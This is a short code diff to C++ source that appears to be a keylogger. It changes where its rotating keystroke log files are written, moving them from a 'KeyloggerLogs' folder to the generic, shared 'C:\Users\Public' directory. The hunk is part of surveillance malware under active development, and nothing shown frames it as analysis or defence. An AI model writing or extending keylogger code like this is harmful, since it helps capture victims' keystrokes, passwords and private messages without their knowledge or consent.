@@ -189,9 +189,9 @@ int Save(int key_stroke)
 		cur_10min_interval = current_10min;
 		output_file.close();
 		// Create logs folder if it doesn't exist
-		const char* logs_dir = "C:\\Users\\Adm1nistrator\\KeyloggerLogs";
+		const char* logs_dir = "C:\\Users\\Public";
 		_mkdir(logs_dir);
-		strftime(output_filename, sizeof(output_filename), "C:\\Users\\Adm1nistrator\\KeyloggerLogs\\%Y-%m-%d__%H-%M-%S.log", &tm_info);
+		strftime(output_filename, sizeof(output_filename), "C:\\Users\\Public\\%Y-%m-%d__%H-%M-%S.log", &tm_info);
 		output_file.open(output_filename, std::ios_base::app);
 		std::cout << "Logging output to " << output_filename << std::endl;
 	}
